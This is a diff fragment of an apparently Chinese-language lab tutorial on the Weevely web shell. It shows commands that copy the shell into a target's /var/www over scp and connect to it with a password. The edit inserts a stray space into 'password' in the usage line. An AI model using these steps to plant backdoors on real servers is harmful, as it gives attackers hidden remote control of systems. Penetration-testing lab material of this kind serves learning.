@@ -147,7 +147,7 @@ root@kali:/usr/share/weevely# cat weevely.php
 > root@kali:/usr/share/weevely# scp weevely.php root@10.10.10.132:/var/www
 
 * 客户端连接服务器
-1. weevely URL password cmd
+1. weevely URL passwo rd cmd
 > root@kali:~# weevely http://10.10.10.132/weevely.php 123456
 
 2. 连上靶机之后，可以使用 help 命令查看所有模块
